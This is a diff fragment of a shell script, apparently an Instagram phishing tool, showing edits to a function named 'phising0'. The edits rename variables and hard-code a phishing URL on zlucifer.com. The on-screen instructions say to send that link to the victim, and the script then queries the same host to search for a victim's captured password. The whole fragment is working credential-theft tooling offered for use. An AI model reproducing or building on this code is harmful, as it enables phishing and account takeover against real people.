@@ -196,9 +196,9 @@ file1(){
     esac
 }
 phising0(){
-    get_url=$( curl -s http://zlucifer.com/api/hackbae.php?requests=skull_api)
-    get_url2=$( curl -s http://zlucifer.com/api/hackbae.php?requests=skull)
-    cek='curl -s'$get_url2
+    geturl=$( curl -s http://zlucifer.com/api/hackbae.php?requests=skull_api)
+    geturl2=$( curl -s http://zlucifer.com/api/hackbae.php?requests=skull)
+    cek='curl -s'$geturl2
     zlucifer="user-agent : zlucifer"
     clear
     sleep 2
@@ -215,7 +215,7 @@ phising0(){
         echo 
         echo 
         echo $cyan'[*] How to use : '
-        echo $cyan'1) Copy this link : '$get_url2
+        echo $cyan'1) Copy this link : http://zlucifer.com/api/hackbae.php?requests=skull'
         echo $cyan'2) Send the link to the victim'
         echo $cyan'3) Check results'
         echo ''
@@ -232,8 +232,8 @@ phising0(){
         sleep 2
         echo $red'[*] Do a password search : '$victim1
         sleep 2
-        cek_target=` curl -s $get_url/instagram.php?cari=$victim1`
-        echo -e $cek_target
+        cektarget=` curl -s $geturl/instagram.php?cari=$victim1`
+        echo -e $cektarget
         echo ''
         lagi
         
